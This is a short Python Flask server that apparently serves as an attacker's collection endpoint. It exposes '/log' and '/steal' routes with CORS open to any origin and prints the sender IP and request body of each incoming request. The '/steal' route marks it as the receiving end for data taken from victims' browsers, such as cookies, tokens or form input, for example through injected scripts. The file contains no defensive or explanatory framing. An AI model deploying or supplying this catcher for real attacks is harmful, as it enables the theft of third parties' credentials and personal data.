from flask import Flask, request, make_response
from datetime import datetime
import os

app = Flask(__name__)

def cors_response(body="OK", status=200):
    response = make_response(body, status)
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "*"
    return response

@app.route('/log', methods=['GET', 'POST', 'OPTIONS'])
@app.route('/steal', methods=['GET', 'POST', 'OPTIONS'])
def log_data():
    if request.method == 'OPTIONS':
        return cors_response()

    ip = request.remote_addr
    data = request.get_data(as_text=True)
    now = datetime.utcnow().isoformat()
    print(f"[{now}] {ip} → {data}", flush=True)

    return cors_response("Logged")

@app.route('/')
def index():
    return cors_response("Logger is up.")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
